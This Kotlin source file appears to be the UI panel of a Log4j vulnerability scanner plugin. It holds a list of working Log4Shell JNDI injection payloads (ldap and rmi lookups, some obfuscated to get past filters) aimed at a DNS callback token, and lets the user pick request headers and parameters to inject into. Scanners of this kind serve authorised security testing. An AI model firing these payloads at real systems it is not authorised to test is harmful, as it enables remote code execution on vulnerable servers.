package com.dexter0us.log4jScanner


import net.miginfocom.swing.MigLayout
import java.awt.*
import java.awt.event.ActionEvent
import java.awt.event.ActionListener
import java.awt.image.BufferedImage
import javax.swing.*

class Log4JTabbkp: JPanel(), ActionListener {
    val dnsToken = ""
    val rand = ""
    private val payloads = arrayOf(
        "\${jndi:ldap://$dnsToken/$rand}",
        "\${jndi:\${lower:l}\${lower:d}a\${lower:p}://$dnsToken/$rand}",
        "\${\${::-j}\${::-n}\${::-d}\${::-i}:\${::-r}\${::-m}\${::-i}://$dnsToken/$rand}",
        "\${\${::-j}ndi:rmi://$dnsToken/$rand}",
        "\${jndi:rmi://$dnsToken/$rand}",
        "\${\${lower:jndi}:\${lower:rmi}://$dnsToken/$rand}",
        "\${\${lower:\${lower:jndi}}:\${lower:rmi}://$dnsToken/$rand}",
        "\${\${env:FOOBAR:-j}ndi\${env:FOOBAR:-:}\${env:FOOBAR:-l}dap\${env:FOOBAR:-:}//$dnsToken/$rand}",
        "Custom Payload."
    )

    private val dnsTokenLabel = JLabel("DNS Token:")
    private val dnsTokenTextBox = JTextField()
    private val payloadLabel = JLabel("Payload:")
    private val payloadComboBox = JComboBox(payloads)
    private val customPayloadLabel = JLabel("Custom Payload:")
    private val customPayloadTextBox = JTextField()

    private val refererHeaderCheckBox = JCheckBox("Referer Header")
    private val originHeaderCheckBox = JCheckBox("Origin Header")
    private val userAgentCheckBox = JCheckBox("User Agent")
    private val cookieParamsCheckBox = JCheckBox("Cookie Parameters")
    private val urlParamsCheckBox = JCheckBox("URL Parameters")
    private val bodyParamsCheckBox = JCheckBox("Body Parameters")
    private val scanButton = JButton("Start Scanning")

    private var twitterButton = JButton()
    private var githubButton = JButton()
    private var blogButton = JButton()
    private var kofiButton = JButton()



    init {
            layout = MigLayout()
            border = BorderFactory.createEmptyBorder(0, 10, 0, 10)
            add(dnsTokenLabel)
            add(dnsTokenTextBox, "wrap")
            add(payloadLabel)
            add(payloadComboBox, "wrap")
            add(customPayloadLabel)
            add(customPayloadTextBox, "wrap")
            //add(JSeparator(SwingConstants.HORIZONTAL), "")
            add(refererHeaderCheckBox)
            add(originHeaderCheckBox)
            add(userAgentCheckBox, "wrap")
            add(cookieParamsCheckBox)
            add(urlParamsCheckBox)
            add(bodyParamsCheckBox, "wrap")
            //add(JSeparator(SwingConstants.HORIZONTAL), "")
            add(scanButton)


            val twitterImage = loadImage("twitter.png")
            when {
                twitterImage != null -> {
                    twitterButton = JButton("Follow me on Twitter", twitterImage)
                    twitterButton.componentOrientation = ComponentOrientation.RIGHT_TO_LEFT
                    twitterButton.iconTextGap = 3
                }
                else -> twitterButton = JButton("Follow me on Twitter")
            }
            twitterButton.addActionListener(this)


            val githubImage = loadImage("github.png")
            when {
                githubImage != null -> {
                    githubButton = JButton("View Project on Github", githubImage)
                    githubButton.componentOrientation = ComponentOrientation.RIGHT_TO_LEFT
                    githubButton.iconTextGap = 3
                }
                else -> githubButton = JButton("View Project on Github")
            }
            githubButton.addActionListener(this)


            val blogImage = loadImage("blog.png")
            when {
                blogImage != null -> {
                    blogButton = JButton("Checkout my Blog", blogImage)
                    blogButton.componentOrientation = ComponentOrientation.RIGHT_TO_LEFT
                    blogButton.iconTextGap = 3
                }
                else -> blogButton = JButton("Checkout my Blog")
            }
            blogButton.addActionListener(this)


            val kofiImage = loadImage("ko-fi.png")
            when {
                kofiImage != null -> {
                    kofiButton = JButton("Support Project on Ko-Fi", kofiImage)
                    kofiButton.componentOrientation = ComponentOrientation.RIGHT_TO_LEFT
                    kofiButton.iconTextGap = 3
                }
                else -> kofiButton = JButton("Buy me a Coffee")
            }
            kofiButton.addActionListener(this)

            //callbacks.customizeUiComponent(mainPanel)
        }

    override fun actionPerformed(e: ActionEvent?) {
        TODO("Not yet implemented")
    }


    // Credits to CoreyD97 for this idea and function

    private fun loadImage(filename: String): ImageIcon? {
        val cldr = this.javaClass.classLoader
        val imageURLMain = cldr.getResource(filename)
        if (imageURLMain != null) {
            val scaled = ImageIcon(imageURLMain).image.getScaledInstance(30, 30, Image.SCALE_SMOOTH)
            val scaledIcon = ImageIcon(scaled)
            val bufferedImage = BufferedImage(30, 30, BufferedImage.TYPE_INT_ARGB)
            val g = bufferedImage.graphics as Graphics2D
            g.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON)
            g.drawImage(scaledIcon.image, null, null)
            return ImageIcon(bufferedImage)
        }
        return null
    }

    private fun alertBox(str: String) {
        JOptionPane.showMessageDialog(this, str, "Scavenger", JOptionPane.PLAIN_MESSAGE)
    }
}
